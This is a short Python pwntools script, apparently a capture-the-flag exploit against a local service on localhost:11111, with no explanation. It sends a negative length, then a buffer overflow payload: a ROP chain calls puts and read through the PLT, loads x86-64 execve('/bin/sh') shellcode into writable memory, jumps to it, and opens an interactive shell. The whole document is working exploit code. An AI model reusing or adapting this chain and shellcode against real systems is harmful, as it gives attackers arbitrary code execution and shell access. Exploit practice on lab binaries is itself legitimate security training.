#!/usr/bin/python
from pwn import *

r = remote('localhost','11111')

r.write('hogehoge\n')
r.read()
sleep(0.1)
r.write('-120\n')
r.read()
sleep(0.5)

popRdi = 0x00400873
popRsi = 0x00400871
putsPlt = 0x400520
readPlt = 0x400540

puts = lambda string:p64(popRdi)+p64(string)+p64(putsPlt)
read = lambda handle,buf:p64(popRdi)+p64(handle)+p64(popRsi)+p64(buf)+p64(0xdeadbeef)+p64(readPlt)
ret = lambda addr:p64(addr)
payload = 'AAAAAAAAAAAAAAAAAAAAAAAA'+puts(0x400898)+read(0,0x00600000)
payload += ret(0x00600000)+'\n'
r.write(payload)
r.read()
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
shellcode += "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.write(shellcode)
r.interactive()
r.close()
